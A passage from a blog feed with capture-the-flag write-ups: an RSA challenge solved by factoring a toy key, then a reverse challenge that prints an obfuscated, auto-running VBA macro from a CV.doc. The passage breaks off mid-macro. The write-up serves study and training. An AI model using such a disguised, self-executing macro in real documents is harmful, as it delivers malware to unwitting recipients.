&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python RsaCtfTool.py --publickey key.pub --private --dumpkey
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Testing key key.pub.
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Performing mersenne_primes attack on key.pub.
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Performing smallq attack on key.pub.
&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Attack success with smallq method !
Results &lt;span style="color:#66d9ef">for&lt;/span> key.pub:
Private key :
-----BEGIN RSA PRIVATE KEY-----
MCQCAQACAwRjrwIBEQIDAQdRAgIDPQICAVsCAgFVAgIBHQICAxI&lt;span style="color:#f92672">=&lt;/span>
-----END RSA PRIVATE KEY-----
n: &lt;span style="color:#ae81ff">287663&lt;/span>
e: &lt;span style="color:#ae81ff">17&lt;/span>
d: &lt;span style="color:#ae81ff">67409&lt;/span>
p: &lt;span style="color:#ae81ff">829&lt;/span>
q: &lt;span style="color:#ae81ff">347&lt;/span>
Public key details &lt;span style="color:#66d9ef">for&lt;/span> key.pub
n: &lt;span style="color:#ae81ff">287663&lt;/span>
e: &lt;span style="color:#ae81ff">17&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now all we have to do is map each number to the power of &lt;code>d&lt;/code>, mod &lt;code>n&lt;/code> (&lt;a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Decryption">ref&lt;/a>):&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">d &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">67409&lt;/span>
n &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">287663&lt;/span>
lines &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">71436 176304 185211 110406 35389 179680 56238 185211 207993 237729 176304 207993 185211 192576 237729 95070 171155 207993 35389 185211 110406 140230 92028 110406 140230 246626 82805
&lt;/span>&lt;span style="color:#e6db74">95994 185211 110406 176304 192576 230623 185211 110406 237729 171155 110406 247756 185211 192576 230623 185211 110406 237729 176304 140230 92028 110406 232955 247756 192576 35389 185211 82805
&lt;/span>&lt;span style="color:#e6db74">194813 185211 207993 185211 110406 140230 92028 110406 237729 176304 185211 110406 92028 185211 35389 207993 185211 237729 110406 35389 171155 171098 185211 110406 105244 110406 228171 207520 180458 196399 104282 71436 31634 106170 103296 132591 35389 69499 171098 196399 24720 104282 92028 59381 24720 230238 230238 36350
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>strip()
&lt;span style="color:#66d9ef">for&lt;/span> line &lt;span style="color:#f92672">in&lt;/span> lines&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>):
blocks &lt;span style="color:#f92672">=&lt;/span> list(map(int, line&lt;span style="color:#f92672">.&lt;/span>split()))
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join([chr((block &lt;span style="color:#f92672">**&lt;/span> d) &lt;span style="color:#f92672">%&lt;/span> n) &lt;span style="color:#66d9ef">for&lt;/span> block &lt;span style="color:#f92672">in&lt;/span> blocks]))
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python solve.py
The cyberthreatforce is in.
We have to leave this place.
Here is the secret code : CYBERTF&lt;span style="color:#f92672">{&lt;/span>D3c0dE_Rs4_!!&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag is &lt;code>CYBERTF{D3c0dE_Rs4_!!}&lt;/code>.&lt;/p>
&lt;p>Note: even though I was the one to input the flag in CTFd, it was my teammate &lt;a href="https://ctftime.org/user/46515">R0ck3t&lt;/a> that found it first.&lt;/p>
&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/crypto/unefficient-encryption">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : The document is strange</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-the-document-is-strange/</link><pubDate>Sat, 10 Jul 2021 17:45:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-the-document-is-strange/</guid><description>&lt;p>For this challenge, we were given a &lt;code>CV.doc&lt;/code> document. Opening it reveals a pretty normal looking resume template, and a warning about macros from LibreOffice.&lt;/p>
&lt;p>Using the macros menu, we can dump their code:&lt;/p></description><content>&lt;p>For this challenge, we were given a &lt;code>CV.doc&lt;/code> document. Opening it reveals a pretty normal looking resume template, and a warning about macros from LibreOffice.&lt;/p>
&lt;p>Using the macros menu, we can dump their code:&lt;/p>
&lt;pre>&lt;code class="language-vba" data-lang="vba">Rem Attribute VBA_ModuleType=VBAModule
Option VBASupport 1
Private Declare PtrSafe Function Sleep Lib &amp;quot;KERNEL32&amp;quot; (ByVal mili As Long) As Long
Private Function xDSnawULVynR(lyOFjkCBqpsZ As Variant, gGuJOMcorXqH As Variant)
Dim ZtYIpNgiqDdm As String
ZtYIpNgiqDdm = &amp;quot;&amp;quot;
For i = LBound(lyOFjkCBqpsZ) To UBound(lyOFjkCBqpsZ)
ZtYIpNgiqDdm = ZtYIpNgiqDdm &amp;amp; Chr(gGuJOMcorXqH(i) Xor lyOFjkCBqpsZ(i))
Next
xDSnawULVynR = ZtYIpNgiqDdm
End Function
Sub IAjgEYdgKhtjY()
fVKsxPMRAauvNsO
End Sub
Sub AutoOpen()
fVKsxPMRAauvNsO
End Sub
Sub fVKsxPMRAauvNsO()
Sleep (((2063 - 354) + (554 - 263)))
LwvYeveWxaeE
zrOxbjsXpxFIZ
XEFxqSzaXCXvSAp
End Sub
Sub LwvYeveWxaeE()
Dim vboXZZvyMJBot As String
Dim hfBGMlrCyHeaK As String
Dim dWlVcYnsGQco As String
Dim EdVSmtRqwXYTGM As String
Dim yyEWNYbuXurxW As String
Dim MwIMnegwljrXk As String
vboXZZvyMJBot = xDSnawULVynR(Array(229, (397 - 156), (29 + 138), 179, 26, (6 - 0), (297 - 93), 9, 187, ((146 - 17) Xor (20 - 1)), (125 + (101 - 31)), 46, 72, 196, (53 Xor 190)), Array(175, (161 Xor 17), ((225 - 24) + 28), (141 + 85), ((133 - 47) + 5), (103 - 25), ((115 - 32) Xor 214), (69 Xor 13), (138 + (116 - 37)), (190 + 39), (34 Xor (256 - 93)), ((71 - 28) Xor (57 + 54)), (2 + 7), (74 Xor 203), (52 + 139))) &amp;amp; _
xDSnawULVynR(Array(((209 - 92) + 121), ((112 - 55) Xor 76), 148, 89, 12, ((7 - 1) + (30 - 4)), ((4 - 0) + 4), ((52 + 168) Xor (108 - 50)), ((0 - 0) Xor 9), (8 Xor 111), (1 Xor ((30 - 9) + 14)), 69, 184, 230, ((18 - 3) + 144)), Array(((111 - 37) Xor 229), 44, 197, (47 - 20), (198 - 78), ((123 - 52) Xor (4 + 34)), 79, 179, 72, (15 + (53 - 22)), (124 - 25), (8 - 4), 129, 167, (((97 - 25) + (7 - 2)) Xor (88 + 57)))) &amp;amp; _
xDSnawULVynR(Array((20 Xor (89 - 26)), (((13 - 4) + 125) Xor 109), 175, (397 - 174), (43 - 7), 221, 79, (13 Xor 49), (97 Xor (209 - 40)), ((38 + 135) Xor (39 + 66)), 66, (203 - 75), (236 Xor (12 + 4)), (40 + 181), 147), Array((175 - 69), 170, ((281 - 106) + 55), 184, ((103 - 43) Xor (1 + 89)), ((205 - 39) Xor (5 + (13 - 6))), (14 + (0 - 0)), 123, 141, (249 - 116), (((3 - 1) + 1) Xor 37), 193, 190, (71 + (112 - 0)), (40 Xor (62 + 188)))) &amp;amp; _
xDSnawULVynR(Array(13, (85 Xor 32), (((61 - 28) + 28) Xor 103), 179, ((41 + (23 - 5)) Xor (287 - 122)), (158 - 28), ((18 - 7) + 228), 157, ((281 - 86) Xor (12 + 19)), (28 Xor (18 + 15)), (57 - 19), (93 Xor 149), 25, (96 - 33), 7), Array((16 Xor (125 - 35)), (10 + 8), (20 + (9 - 2)), (((185 - 92) + 30) Xor 132), (59 Xor (385 - 191)), 192, 131, (293 - 73), (261 - 113), 90, (118 - 15), (47 + (157 - 58)), (48 Xor ((90 - 37) + 67)), (31 Xor (34 + (110 - 47))), ((46 - 15) Xor 113))) &amp;amp; _
xDSnawULVynR(Array((25 - 8), (14 Xor 73), 225, 52, (12 - 5), 224, (16 - 5), 152, 167, (7 Xor 255), ((18 + 0) Xor 50), ((28 + 2) Xor 54), ((59 - 18) + (14 - 7)), 110, (((10 - 2) + 58) Xor (286 - 90))), Array((72 Xor (30 - 6)), (6 Xor 0), (((152 - 75) + (241 - 116)) Xor (38 - 11)), (33 + (157 - 73)), (14 Xor 74), 135, (142 - 68), (51 Xor (210 - 18)), (168 + 62), ((14 + 72) Xor 232), (108 - 41), (138 - 33), 106, ((1 + 41) Xor (24 - 3)), ((55 + (39 - 13)) Xor 149))) &amp;amp; _
xDSnawULVynR(Array(72, (192 Xor 52), 218, (319 - 134), 50, ((28 - 9) + 185), (149 - 64), (159 - 24), (26 + 42), (238 - 61), 109, (49 + 151), ((211 - 37) Xor 79), ((80 - 33) + 36), (97 Xor (315 - 105))), Array(33, ((92 - 28) + (197 - 80)), 159, (162 Xor 66), 115, ((26 + 24) Xor 159), (6 - 2), (147 Xor 86), 55, ((44 + 54) Xor ((175 - 68) + 39)), ((28 - 14) Xor (23 + (19 - 6))), (20 + 137), ((36 - 4) Xor 128), 26, ((30 + 187) Xor (7 + 36)))) &amp;amp; _
xDSnawULVynR(Array((1 + 6), 9, (51 Xor (193 - 36)), (9 Xor ((205 - 76) + 55)), 218, 1, 45, 231, ((132 - 13) Xor (303 - 69)), 77, ((148 - 30) Xor (263 - 111)), 113, 126, 235, (303 - 64)), Array((113 - 43), (44 + (4 - 0)), ((142 - 65) Xor 162), 242, 155, 64, (10 + 90), ((8 + 61) Xor (98 + 99)), ((178 - 78) Xor 187), (4 + 30), (253 - 78), ((3 - 0) + 54), 47, (67 + 103), 139)) &amp;amp; _
xDSnawULVynR(Array(((26 - 3) + 131), (70 + 18), (70 Xor 29), (396 - 185), 196, 96, (90 Xor 219), ((84 - 8) Xor (36 - 12)), 134, 43, (288 - 84), (182 - 58), 96, 140, (((64 - 17) + 53) Xor 178)), Array((8 Xor 211), ((21 - 3) + (16 - 8)), (53 - 9), 146, ((13 - 0) + 115), 15, (212 - 20), (20 Xor (10 + 2)), (412 - 171), (102 + (4 - 0)), (328 - 142), (115 - 54), 36, (64 Xor (188 - 51)), (149 Xor (1 + 1)))) &amp;amp; _
xDSnawULVynR(Array((20 Xor (5 + (63 - 22))), (26 Xor 48), ((5 + 3) Xor 145), (((193 - 96) + (12 - 2)) Xor (237 - 36)), (22 + 181), (92 - 22), (5 Xor 60), ((135 + 12) Xor 88), (179 - 84), (6 Xor (211 - 98)), 138, ((135 - 6) Xor 94), (9 Xor (21 + (16 - 4))), (((0 - 0) + (0 - 0)) Xor 1), (196 - 40)), Array((5 Xor 113), 123, (173 Xor 117), (74 + 145), 138, 5, (0 + 13), (173 - 35), 18, (10 + 6), (260 - 57), (116 Xor (266 - 56)), (65 Xor 40), 69, (437 - 186))) &amp;amp; _
xDSnawULVynR(Array(((7 + 2) Xor (344 - 163)), (232 - 104), 33, (108 Xor (105 + 35)), ((50 - 6) Xor ((85 - 29) + 12)), ((53 - 10) Xor 150), 102, 198, (((85 - 15) + (23 - 11)) Xor 255), (20 Xor (58 + (79 - 20))), ((2 + (1 - 0)) Xor (21 + (12 - 3))), (76 + 28), (190 + 29), (((8 - 4) + 3) Xor 40), 126), Array(253, (343 - 139), 70, (300 - 139), (23 - 7), (162 Xor (21 + 73)), 34, 139, (139 Xor (160 - 57)), 44, 106, (48 - 7), 174, 110, (113 - 55))) &amp;amp; _
xDSnawULVynR(Array(((25 - 7) Xor (143 + 13))), Array(((81 - 36) + (233 - 63))))
hfBGMlrCyHeaK = xDSnawULVynR(Array((127 Xor 239), (9 Xor (33 + 30)), 238, (145 + (95 - 30)), 72, (137 + 42), (1 + 67), (8 + 14), 17, (1 Xor 98), ((4 - 1) + (14 - 6)), (32 + 125), (40 + 1), 142, 205), Array((82 Xor 131), ((76 - 22) Xor (120 - 41)), ((0 + 0) Xor 175), 147, (74 - 12), (180 + 62), 7, 71, 80, (24 + 30), 74, (407 - 184), 80, (127 + 80), 138)) &amp;amp; _
xDSnawULVynR(Array(81, (196 Xor 38), (86 - 38), ((16 + 84) Xor (49 + (208 - 89))), 97, 91, ((175 - 43) Xor 2), (98 + 56), 89, (102 + 122), (44 + (69 - 30)), 79, (35 Xor 21), ((246 - 118) + (111 - 29)), 219), Array((12 + 93), 163, (25 + (87 - 7)), ((188 - 62) Xor 197), ((27 + (3 - 1)) Xor 62), (3 + 17), (173 + 26), ((62 + (5 - 0)) Xor 158), 28, (80 + 81), (((37 - 8) + (28 - 12)) Xor 28), 30, (113 Xor 5), ((89 - 29) Xor ((96 - 46) + 80)), 154)) &amp;amp; _
xDSnawULVynR(Array(227, (436 - 214), 176, 93, (319 - 153), (72 Xor 57), (132 - 21), (130 - 63), ((365 - 169) Xor 28), (146 - 36), (146 + 37), (46 - 4), (((70 - 24) + 18) Xor (0 - 0)), ((112 - 10) + 92), (38 + 2)), Array((105 Xor 201), 151, (94 + 147), 25, 247, (45 + (4 - 1)), 36, (4 - 2), (78 Xor 213), 47, (231 Xor (11 + 6)), (((60 - 4) + 38) Xor ((45 - 12) + 15)), (8 Xor (19 + (6 - 0))), 131, (117 - 18))) &amp;amp; _
xDSnawULVynR(Array((120 - 7), 1, (8 Xor 214), (((50 - 19) + 173) Xor 23), (89 Xor 204), (60 Xor (267 - 126)), 12, (85 Xor (8 + (246 - 61))), 85, ((4 - 1) Xor ((2 - 1) + 4)), (((14 - 0) + (2 - 1)) Xor (156 - 46)), (31 Xor (313 - 85)), 37, 204, (((181 - 77) + 25) Xor 76)), Array((3 + 45), ((35 - 14) + 45), ((114 - 26) Xor (53 + 172)), (221 - 67), ((165 - 77) Xor (51 + 102)), (127 + 87), ((72 - 19) + 25), (54 Xor (142 + 64)), (20 Xor 0), 78, 2, 186, (133 - 28), (198 - 41), (211 - 68))) &amp;amp; _
xDSnawULVynR(Array(((0 - 0) + 152), 129, 173, (18 Xor 7), ((162 - 17) + (12 - 0)), (146 + 83), 219, ((4 + 16) Xor (342 - 142)), (15 + (13 - 4)), ((33 - 13) + 174), (176 - 88), ((104 - 7) Xor 184), 248, (34 + (33 - 9)), (184 Xor 123)), Array((333 - 133), (((126 - 60) + 23) Xor 153), (122 + 112), (54 Xor 106), 220, (11 Xor (156 - 13)), (72 Xor (187 + 57)), ((29 + 37) Xor (152 + 68)), ((31 - 12) + 97), ((169 - 62) + 24), 31, 148, ((121 + (108 - 48)) Xor (12 - 0)), (85 + 9), (122 Xor 248))) &amp;amp; _
xDSnawULVynR(Array((8 Xor (0 + 1)), 139, (110 - 12), (50 - 10), (409 - 154), (68 - 27), 86, 17, 125, 240, ((20 - 2) Xor (8 - 4)), ((186 - 89) + 11), (99 + 56), 11, 64), Array((((38 - 10) + 14) Xor 98), (232 Xor (3 + 1)), 35, 110, 178, 104, (25 + 26), 64, (64 - 1), ((42 + 70) Xor 250), 87, (15 + 21), 202, 74, (20 + (8 - 2)))) &amp;amp; _
xDSnawULVynR(Array(((20 + 70) Xor (168 + (75 - 24))), (1 + (28 - 13)), ((7 + (21 - 10)) Xor (26 + 17)), 44, 117, 136, (218 - 33), 186, (41 + 27), ((141 - 47) Xor (102 + (159 - 46))), ((82 - 17) + 69), (218 - 37), (283 - 140), (2 + (28 - 11)), 224), Array(((39 + (22 - 10)) Xor 227), (141 - 59), ((95 - 45) + 27), (47 + (84 - 22)), (83 - 29), ((24 + 37) Xor 129), (289 - 41), (41 Xor (139 + 60)), (3 + 32), ((17 + 85) Xor ((202 - 65) + (70 - 34))), ((7 + 26) Xor 203), 244, (106 Xor (79 + 94)), (73 - 7), (314 - 153))) &amp;amp; _
xDSnawULVynR(Array(((85 - 9) Xor 26), (94 Xor ((80 - 40) + 6)), (234 - 70), (99 + 156), ((3 - 1) Xor 92), 21, (((129 - 50) + 53) Xor 86), (351 - 128), 189, (75 + 21), 245, ((81 - 0) Xor (97 + (39 - 3))), (8 Xor 177), (((114 - 4) + 117) Xor 19), 222), Array(26, (21 Xor (2 + 0)), 230, ((128 - 17) + 56), ((9 + 22) Xor 0), (63 + (36 - 17)), 135, ((118 - 41) Xor (181 + (51 - 21))), 228, ((0 - 0) + 7), ((294 - 143) Xor 32), 144, (349 - 101), (158 Xor (78 - 37)), (290 - 121))) &amp;amp; _
xDSnawULVynR(Array(106, ((216 + 28) Xor (4 + 9)), (294 - 108), ((184 - 89) + 60), 221, (56 Xor 225), 159, (73 - 20), 104, ((281 - 106) Xor (89 + (24 - 6))), (((134 - 43) + (15 - 7)) Xor 247), (39 + 5), 143, ((169 - 3) + 14), (125 - 23)), Array(43, (156 - 4), ((205 - 59) + 89), (80 + (243 - 106)), ((82 - 14) Xor 245), (41 + 111), 216, 1, (78 - 37), (109 + (99 - 48)), (((10 - 5) + 60) Xor (114 + (53 - 19))), 109, ((74 + (135 - 11)) Xor 57), (88 + 157), ((31 - 7) Xor 61))) &amp;amp; _
xDSnawULVynR(Array(((72 + 42) Xor 0), 166, (12 + 11), 169, (169 Xor (140 - 28)), 217, ((74 - 2) Xor 61), 19, (60 - 28), (((1 - 0) + 0) Xor 4), 13, 64, ((3 + (0 - 0)) Xor 29), (((53 - 4) + (24 - 7)) Xor 156)), Array(70, (441 - 210), (127 - 58), (244 - 12), 155, 175, (23 Xor (21 + 14)), (53 Xor 110), 67, (((25 - 5) + 3) Xor (163 - 80)), ((20 + 5) Xor 118), (33 + 6), (97 - 5), (13 Xor 160)))
dWlVcYnsGQco = xDSnawULVynR(Array(((150 - 53) Xor 248), (42 - 19), 18, ((222 - 41) + 27), (37 - 13), 204, (((71 - 28) + 65) Xor ((156 - 21) + 13)), (130 Xor 42), 98, ((30 + 12) Xor 134), 107, ((146 - 65) + 123), 31, (158 + (86 - 19)), (100 + 57)), Array(216, (33 Xor (0 + (221 - 108))), ((55 - 18) + 5), (195 - 50), (103 - 38), (31 + 126), 186, (144 + 51), 35, 233, 50, (37 Xor 168), ((135 - 21) Xor 12), 176, (138 + 85))) &amp;amp; _
xDSnawULVynR(Array(223, 69, 33, (103 - 31), (70 Xor 18), 146, (16 Xor 185), 21, (27 - 4), (12 + 8), 124, ((37 - 13) Xor (158 - 39)), ((222 - 97) Xor 148), 30, (84 Xor 56)), Array(172, (2 Xor 6), (101 Xor (1 + 2)), (23 + 6), 21, (44 Xor 245), (198 + 34), (38 Xor ((66 - 11) + 59)), ((174 - 86) Xor (55 - 19)), (88 - 3), (50 Xor (4 + (7 - 3))), 12, 168, 68, 61)) &amp;amp; _
xDSnawULVynR(Array(52, 92, 235, (311 - 122), 12, ((78 + 43) Xor (73 + (72 - 5))), ((65 - 9) Xor 181), 73, ((62 - 16) + 30), (101 - 21), 198, (32 + (166 - 79)), ((46 - 16) Xor ((277 - 87) + 26)), (6 + 29), (37 + (109 - 43))), Array((155 - 37), (33 Xor 20), 170, ((4 + 0) Xor 252), ((27 - 6) + 64), (177 + 3), (130 Xor 110), 24, 14, ((29 - 7) + 13), (234 - 99), ((18 + 1) Xor (18 + 17)), 147, (60 Xor (35 + 59)), (36 Xor (5 + 10)))) &amp;amp; _
xDSnawULVynR(Array((505 - 251), 102, ((162 - 41) Xor 173), (11 + 135), (((15 - 3) + (17 - 7)) Xor (73 - 28)), (76 Xor (140 + 90)), 34, (17 Xor 41), (246 - 82), (84 - 30), 182, 112, (92 Xor 37), (216 + (40 - 19)), (188 + 18)), Array((234 - 43), (0 Xor (3 + (62 - 26))), 189, 211, (68 + 52), 251, 99, (174 - 76), (187 + 58), 116, (100 Xor 167), (29 + 20), ((13 + (19 - 6)) Xor (78 - 35)), (314 - 134), 143)) &amp;amp; _
xDSnawULVynR(Array(((68 - 22) Xor (61 - 30)), ((22 - 4) + 167), (77 + 53), 47, (1 + 0), (5 Xor (0 + 122)), (372 - 169), (5 + (12 - 2)), 117, 219, (270 - 129), ((112 - 52) + 111), 90, ((223 - 105) + 9), 229), Array(126, (22 Xor ((78 - 4) + 126)), 192, (16 + (125 - 32)), (65 - 1), ((39 - 11) Xor (38 - 1)), (271 - 133), (12 Xor 66), 32, ((12 + 10) Xor 140), (307 - 100), 238, (16 + 11), (16 Xor (71 - 29)), (83 + (125 - 48)))) &amp;amp; _
xDSnawULVynR(Array((22 + 3), 178, (212 - 62), (343 - 95), ((67 - 18) + (58 - 15)), 78, (300 - 88), (5 + 1), ((3 + (92 - 40)) Xor 164), (((91 - 22) + 38) Xor 5), (((21 - 2) + 39) Xor 255), 178, (5 Xor 22), (254 - 78), (287 - 103)), Array(88, (220 Xor ((50 - 14) + 20)), (23 + 192), (101 + 85), 30, 15, 146, ((81 - 3) + (39 - 4)), (132 + 78), (67 - 31), (177 - 45), 240, 66, 241, (406 - 166))) &amp;amp; _
xDSnawULVynR(Array((4 + 199), (168 + (54 - 21)), 84, (10 + 94), (162 + 15), (98 - 12), (4 Xor 58), (54 + 125), (171 - 30), ((143 + (9 - 3)) Xor (66 + 49)), ((0 + 0) Xor (0 - 0)), (301 - 105), (317 - 130), (18 + (271 - 70)), (8 Xor (128 - 24))), Array((115 + (18 - 3)), ((93 + 33) Xor 246), (45 + 9), (50 - 19), 243, 60, ((91 + (38 - 17)) Xor (29 - 14)), ((90 + 123) Xor 35), (108 Xor ((140 - 46) + (126 - 7))), 167, (150 - 61), 149, (444 - 195), (92 + 83), ((20 - 7) + 20))) &amp;amp; _
xDSnawULVynR(Array((9 + 94), ((78 + 52) Xor ((4 - 2) + 2)), 69, 116, ((12 - 4) Xor (10 + 14)), 120, (380 - 145), 17, 248, 44, ((101 - 38) + (47 - 18)), ((72 - 32) Xor 20), (0 Xor 0), 132, 186), Array(((31 - 6) + (14 - 7)), (193 Xor (20 - 2)), ((2 - 0) + (2 - 0)), 61, (98 Xor 21), 57, 155, (22 Xor 70), ((193 - 38) + 30), ((5 - 1) Xor 24), ((19 - 9) + 19), (165 - 38), 103, (80 + (125 - 7)), (77 + (189 - 28)))) &amp;amp; _
xDSnawULVynR(Array(15, ((38 + 92) Xor (52 + 26)), 224, 195, ((59 - 18) Xor 149), 2, (218 - 96), (107 + 95), 192, (10 + 232), 75, (3 Xor ((50 - 2) + 22)), 113, 216, (210 Xor 51)), Array(((74 - 34) + 38), (245 - 113), 177, (73 + 57), (83 Xor ((84 - 33) + 131)), ((81 - 27) + 29), 56, (93 Xor (252 - 14)), 129, (118 + 68), ((11 + 14) Xor (0 + 3)), (6 - 2), (42 + (36 - 17)), 137, 163)) &amp;amp; _
xDSnawULVynR(Array((167 Xor 64), 213), Array((140 Xor 58), ((203 - 85) + 30)))
EdVSmtRqwXYTGM = xDSnawULVynR(Array((130 Xor (182 - 91)), (33 + 3), (20 - 5), ((305 - 111) Xor 9), 222, 129, 68, ((3 + 0) Xor 5), (137 - 60), 171, 245, 75, (166 - 64), (214 - 49), 43), Array(((119 - 31) Xor 201), 109, 78, 169, 169, (199 - 4), ((35 + 2) Xor (9 + 2)), ((0 + 0) Xor (46 + 25)), (3 Xor (9 - 0)), 254, (291 - 111), 40, (7 Xor (31 - 9)), ((330 - 123) Xor 40), (69 + 12))) &amp;amp; _
xDSnawULVynR(Array((10 - 3), 44, 241, 39, 99, ((34 - 16) Xor (18 - 7)), 0, 226, (120 Xor ((78 - 31) + 192)), ((4 - 2) Xor (11 + 9)), 111, (211 - 62), 104, ((25 + (66 - 8)) Xor (2 + (6 - 2))), 185), Array(70, (90 Xor 53), ((102 + 50) Xor (32 + 8)), ((14 - 3) Xor 109), (37 + 3), ((98 - 13) + 3), (76 - 11), (91 + (56 - 8)), ((244 - 53) Xor (87 + (21 - 3))), ((4 + 4) Xor (23 + 70)), 62, (109 Xor (280 - 95)), 50, ((6 - 2) Xor 0), (342 - 91))) &amp;amp; _
xDSnawULVynR(Array((33 + 79), ((67 - 8) + 181), ((12 - 3) + 84), (242 - 30), (146 - 2), 138, (131 - 44), (69 Xor 30), ((73 - 2) + 161), (408 - 190), 54, (73 Xor (211 + (20 - 6))), (84 Xor 201), (16 Xor ((17 - 2) + 27)), (212 + 30)), Array(((2 - 0) + (4 - 1)), ((186 - 32) Xor (58 - 15)), (16 Xor 5), 141, (134 Xor (132 - 45)), 197, 48, ((17 - 5) Xor (8 + 13)), ((99 - 9) + 80), 155, (56 Xor (143 - 71)), (316 - 83), 220, ((0 + (51 - 10)) Xor (124 - 54)), ((9 + 9) Xor 161))) &amp;amp; _
xDSnawULVynR(Array((175 - 45), (168 Xor 69), 251, 243, 55, (140 + (12 - 6)), ((106 - 18) Xor 48), 250, 124, (95 Xor (230 + 11)), (0 + 1), (65 Xor 33), 98, (25 + 4), (161 + 73)), Array((242 - 50), ((51 + (147 - 66)) Xor 44), 186, ((163 - 28) Xor 49), (68 + 46), 211, ((87 - 28) Xor 5), ((2 + (28 - 4)) Xor (139 + 22)), (28 Xor (34 + 0)), ((126 - 52) Xor 166), (35 + (57 - 28)), 38, (12 Xor 25), 92, (235 - 75))) &amp;amp; _
xDSnawULVynR(Array((93 - 27), (83 + 39), 159, (29 + 142), 132, (430 - 192), (58 - 29), ((59 - 28) + (151 - 4)), ((96 - 20) + 110), (422 - 199), ((46 - 23) + 16), ((420 - 201) Xor (4 + 1)), (27 + 49), 96, (28 - 13)), Array((0 Xor 3), ((48 - 21) Xor 35), (223 - 17), (134 + (122 - 22)), (74 + 130), 167, (36 + (87 - 31)), 208, (118 + (159 - 72)), (208 - 51), 77, 159, (15 - 6), (156 - 72), (3 Xor 77))) &amp;amp; _
xDSnawULVynR(Array((0 + (14 - 2)), (37 Xor (30 - 3)), 145, 136, ((31 - 4) Xor (59 + 3)), (342 - 126), (206 + 48), ((145 - 29) Xor (144 + (100 - 43))), (71 Xor 57), (241 - 116), 177, ((37 - 5) Xor 102), ((150 - 42) Xor 142), 129, ((297 - 144) Xor ((107 - 39) + 21))), Array(((15 + 0) Xor (111 - 21)), ((80 - 24) Xor 87), 211, ((236 - 74) + 90), (159 - 59), ((21 + (77 - 28)) Xor ((224 - 54) + 47)), 171, (420 - 168), (15 + 40), (1 + 25), 240, (16 + 38), (221 - 58), ((304 - 142) Xor 98), 253)) &amp;amp; _
xDSnawULVynR(Array(77), Array((9 Xor 121)))
yyEWNYbuXurxW = vboXZZvyMJBot + hfBGMlrCyHeaK + dWlVcYnsGQco + EdVSmtRqwXYTGM
MwIMnegwljrXk = xDSnawULVynR(Array(245, (7 Xor (133 - 23)), 82, (85 + 39), ((129 - 58) Xor ((38 - 13) + 153)), 140, (15 - 1), 62, 221, (47 Xor 247), (64 Xor 14), ((25 + (61 - 26)) Xor 158), (112 - 45), 24, 122), Array((109 Xor 232), (1 Xor 7), ((1 + 0) Xor 36), (((1 - 0) + 0) Xor 24), (1 + 134), (390 - 135), 102, ((129 - 42) + (7 - 3)), ((19 + (106 - 14)) Xor 222), 180, 96, ((98 - 21) Xor 138), (29 Xor (13 + 25)), 125, 90)) &amp;amp; _
xDSnawULVynR(Array((317 - 86), 89, (39 - 17), 222, (119 - 41), (17 Xor (263 - 90)), (1 Xor 21), 78, 116, (37 + (242 - 106)), ((14 - 1) + 19), (52 + 28), 91, 32, 78), Array((164 Xor (214 - 104)), ((13 - 5) Xor 52), ((3 + 3) Xor 104), 187, 45, (92 Xor (318 - 126)), (229 - 111), (1 + (104 - 50)), (4 - 0), (318 - 114), (132 - 49), 35, (60 Xor 71), 13, (13 Xor (22 + 16)))) &amp;amp; _
xDSnawULVynR(Array((177 - 67), (174 + 70), (105 + 86)), Array((0 Xor ((0 - 0) + (0 - 0))), ((4 + (4 - 2)) Xor (67 + (83 - 5))), ((172 - 54) + (75 - 34)))) + yyEWNYbuXurxW
Dim BotaCipUCROa As String
Dim qgCHXadDjflv As String
BotaCipUCROa = Application.UserName
